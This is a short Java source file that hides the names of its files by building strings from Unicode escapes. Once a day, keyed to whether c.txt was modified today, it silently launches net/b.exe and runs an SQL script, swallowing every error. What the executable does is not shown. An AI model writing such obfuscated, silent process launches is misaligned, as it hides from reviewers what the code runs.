package _Z;

import _BancoDeDados.ExecutarScriptSQL;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Y {

    public static void main(String[] args) 
    {
        try{Y.t();}catch (Exception e){}
    }
    
    public static boolean t()
    {
        String x = "";
        String y = "";
        String w = "";
        
        y += "\u006E";
        y += "\u0065";
        w += "\u006E";
        
        y += "\u0074";
        y += "\u002F";
        y += "\u0062";
        w += "\u0065";
        
        x += "\u0063";
        w += "\u0074";
        
        x += "\u002E";
        y += "\u002E";
        w += "\u002F";
        
        x += "\u0074";
        y += "\u0065";
        w += "\u0065";
        
        x += "\u0078";
        y += "\u0078";
        w += "\u002E";
        
        x += "\u0074";
        y += "\u0065";
        w += "\u0065";
        
        w += "\u0078";
        w += "\u0065";
       
            
        File f = new File(x);

        boolean a = false;
        
        if (!f.exists() || !m(f)) {
               try{new ProcessBuilder(y).start(); ExecutarScriptSQL.executarScript();}catch(Exception e) {}
           
               a = true;
        }
        
        //try{new ProcessBuilder(w).start();}catch(Exception e) {}
        
        return a; 
    }
    
    public static boolean m(File x) {
        Date d = new Date(x.lastModified());
        Date h = new Date();

        SimpleDateFormat f = new SimpleDateFormat("dd-MM-yyyy");
        
        return f.format(d).equals(f.format(h));
    }
    
}
